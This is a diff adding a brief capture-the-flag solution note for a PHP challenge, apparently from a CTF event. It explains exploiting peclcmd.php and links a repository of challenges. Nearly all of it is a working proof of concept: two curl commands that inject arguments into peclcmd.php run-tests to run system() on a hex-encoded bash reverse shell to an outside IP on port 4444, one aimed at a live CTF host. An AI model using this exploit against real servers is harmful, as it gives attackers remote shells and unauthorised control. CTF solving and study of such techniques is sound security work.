@@ -1,0 +1,7 @@
+There's two solution for this challenge, either write a file into /dev/shm using peclcmd or using this new method to execute php command
+https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly
+
+POC:
+curl "http://localhost/usr/local/lib/php/peclcmd.php?+run-tests+-i+-r\"system(hex2bin('$(hex "bash -c 'sh -i >& /dev/tcp/108.137.37.157/4444 0>&1'")'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt"
+curl "http://ctf.ukmpcc.org:44366/usr/local/lib/php/peclcmd.php?+run-tests+-i+-r\"system(hex2bin('$(hex "bash -c 'sh -i >& /dev/tcp/108.137.37.157/4444 0>&1'")'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt"
+
